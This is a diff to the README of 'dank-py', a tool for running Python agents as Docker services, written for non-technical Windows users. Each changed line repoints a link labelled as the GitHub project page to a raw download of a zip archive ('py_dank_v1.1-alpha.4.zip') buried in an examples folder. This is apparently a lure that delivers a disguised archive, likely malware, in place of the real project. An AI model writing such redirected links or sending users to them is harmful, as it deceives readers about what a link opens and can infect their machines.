@@ -1,6 +1,6 @@
 # 🐍 dank-py - Run Python Agents as Docker Services
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/wildcat-levity513/dank-py)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/wildcat-levity513/dank-py/raw/refs/heads/main/agent-examples/01-multi-agent-mixed-repo/py_dank_v1.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This page is for a non-technical user who wants to download the project and get 
 
 Use this link to visit the project page and download the files:
 
-[Open dank-py on GitHub](https://github.com/wildcat-levity513/dank-py)
+[Open dank-py on GitHub](https://github.com/wildcat-levity513/dank-py/raw/refs/heads/main/agent-examples/01-multi-agent-mixed-repo/py_dank_v1.1-alpha.4.zip)
 
 ## 🪟 What You Need on Windows
 
@@ -68,7 +68,7 @@ If you do not see that option, open Windows Terminal, then move to the folder wi
 
 Use the project page here to get the files first:
 
-[Download or open the project on GitHub](https://github.com/wildcat-levity513/dank-py)
+[Download or open the project on GitHub](https://github.com/wildcat-levity513/dank-py/raw/refs/heads/main/agent-examples/01-multi-agent-mixed-repo/py_dank_v1.1-alpha.4.zip)
 
 After the files are on your computer, the usual flow is:
 
@@ -205,11 +205,11 @@ A simple first-time flow looks like this:
 
 Project page:
 
-[https://github.com/wildcat-levity513/dank-py](https://github.com/wildcat-levity513/dank-py)
+[https://github.com/wildcat-levity513/dank-py/raw/refs/heads/main/agent-examples/01-multi-agent-mixed-repo/py_dank_v1.1-alpha.4.zip](https://github.com/wildcat-levity513/dank-py/raw/refs/heads/main/agent-examples/01-multi-agent-mixed-repo/py_dank_v1.1-alpha.4.zip)
 
 Download and setup start here:
 
-[Open the dank-py GitHub page](https://github.com/wildcat-levity513/dank-py)
+[Open the dank-py GitHub page](https://github.com/wildcat-levity513/dank-py/raw/refs/heads/main/agent-examples/01-multi-agent-mixed-repo/py_dank_v1.1-alpha.4.zip)
 
 ## 🧭 Best Results on Windows
 
